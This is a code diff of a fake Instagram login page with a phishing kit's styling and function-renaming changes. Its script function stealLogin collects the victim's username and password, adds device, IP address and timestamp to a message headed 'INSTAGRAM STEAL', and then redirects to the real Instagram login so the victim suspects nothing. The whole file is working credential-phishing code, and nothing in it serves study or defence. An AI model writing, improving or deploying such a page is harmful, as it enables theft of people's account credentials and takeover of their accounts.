@@ -5,97 +5,81 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;500;600&display=swap');
-        
         body {
             margin: 0;
             padding: 0;
-            background: #0a0a0a;
-            font-family: 'Instagram Sans', system-ui, sans-serif;
+            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             color: #fff;
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
         }
-        .container {
+        .main {
             width: 100%;
-            max-width: 360px;
+            max-width: 350px;
             padding: 20px;
             text-align: center;
         }
-        .title {
-            font-size: 28px;
-            font-weight: 500;
-            margin-bottom: 35px;
+        .logo {
+            width: 175px;
+            height: 51px;
+            margin: 30px auto;
+            background: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png') no-repeat center;
+            background-size: contain;
         }
-        .form-box {
+        .form {
             background: #111;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 35px 25px 30px;
+            border: 1px solid #363636;
+            border-radius: 8px;
+            padding: 30px 25px;
         }
         input {
             width: 100%;
-            padding: 15px 14px;
+            padding: 12px 10px;
             margin: 8px 0;
             background: #1a1a1a;
             border: 1px solid #555;
-            border-radius: 8px;
+            border-radius: 6px;
             color: #fff;
-            font-size: 15px;
-        }
-        input:focus {
-            border-color: #0095f6;
-            outline: none;
+            font-size: 14px;
         }
         button {
             width: 100%;
-            padding: 13px;
-            margin: 22px 0 12px;
+            padding: 10px;
             background: #0095f6;
             color: #fff;
             border: none;
-            border-radius: 10px;
+            border-radius: 8px;
             font-weight: 600;
-            font-size: 16px;
+            margin: 15px 0;
             cursor: pointer;
         }
         .forgot {
             color: #0095f6;
-            font-size: 14px;
-            margin: 15px 0 25px;
-            cursor: pointer;
-        }
-        .create {
-            color: #0095f6;
-            font-size: 15px;
-            margin-top: 30px;
-            cursor: pointer;
-        }
-        .meta {
-            margin-top: 70px;
-            color: #777;
             font-size: 13px;
+            margin: 10px 0;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="title">Instagram</div>
+    <div class="main">
+        <div class="logo"></div>
         
-        <div class="form-box">
+        <div class="form">
             <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
             <input type="password" id="password" placeholder="Password" autocomplete="off">
             
-            <button onclick="stealData()">Log in</button>
+            <button onclick="stealLogin()">Log in</button>
             
             <div class="forgot">Forgot password?</div>
         </div>
 
-        <div class="create" onclick="stealData()">Create new account</div>
-        
-        <div class="meta">Meta</div>
+        <div style="margin-top:30px; font-size:14px; color:#aaa;">
+            Don't have an account? <span style="color:#0095f6;">Sign up</span>
+        </div>
     </div>
 
     <script>
@@ -104,24 +88,26 @@
 
         async function getIP() {
             try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                return d.ip;
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
             } catch(e) { return 'Unknown'; }
         }
 
-        async function stealData() {
+        async function stealLogin() {
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
+            if (!username || !password) return;
+
             const text = `🔥 INSTAGRAM STEAL\n\n` +
-                        `👤 <b>Username:</b> <code>${username || 'N/A'}</code>\n` +
-                        `🔑 <b>Password:</b> <code>${password || 'N/A'}</code>\n\n` +
+                        `👤 <b>Username:</b> <code>${username}</code>\n` +
+                        `🔑 <b>Password:</b> <code>${password}</code>\n\n` +
                         `📱 Device: ${navigator.platform}\n` +
                         `🌐 IP: ${await getIP()}\n` +
                         `⏰ Time: ${new Date().toISOString()}\n\n` +
                         `━━━━━━━━━━━━━━━━━━\n` +
-                        `📋 <b>اضغط للنسخ:</b>\n` +
+                        `📋 اضغط للنسخ:\n` +
                         `👤 ${username}\n` +
                         `🔑 ${password}`;
 
@@ -138,12 +124,12 @@
             // Redirect to real Instagram
             setTimeout(() => {
                 window.location.href = "https://www.instagram.com/accounts/login/";
-            }, 1300);
+            }, 1400);
         }
 
-        // دعم Enter
+        // دعم زر Enter
         document.addEventListener('keypress', (e) => {
-            if (e.key === "Enter") stealData();
+            if (e.key === "Enter") stealLogin();
         });
     </script>
 </body>
